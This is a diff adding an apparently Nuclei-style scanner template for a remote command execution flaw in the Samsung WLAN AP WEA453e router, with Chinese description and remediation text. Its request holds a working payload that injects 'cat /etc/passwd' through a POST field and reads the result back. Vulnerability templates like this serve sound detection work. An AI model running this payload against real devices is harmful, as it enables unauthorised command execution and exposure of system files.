@@ -1,0 +1,36 @@
+id: samsung-wlan-ap-rce
+info:
+  name: Samsung Wlan AP (WEA453e) RCE
+  author:
+  - l0ne1y
+  tags:
+  - xss
+  - samsung
+  - rce
+  description: |-
+    三星路由器WLAN AP存在命令执行漏洞
+    三星（中国）投资有限公司是三星集团在中国的总部。截至2008年底，三星旗下30多家公司中已有20家在中国投资，包括三星电子、三星SDI、三星SDS、三星电机等。
+
+    三星路由器WLAN AP存在命令执行漏洞。攻击者可利用该漏洞执行命令。
+  reference:
+  - https://iryl.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/
+  severity: critical
+  remediation: |-
+    官方修复方案：
+    1.建议用户到官方获取最新补丁或者最新版本程序：
+    https://www.samsung.com/
+requests:
+- matchers:
+  - type: regex
+    part: body
+    regex:
+    - 'root:.*:0:0:'
+    - bin:.*:1:1
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/(download)/tmp/poc.txt'
+  method: POST
+  body: command1=shell%3Acat /etc/passwd|dd of=/tmp/poc.txt
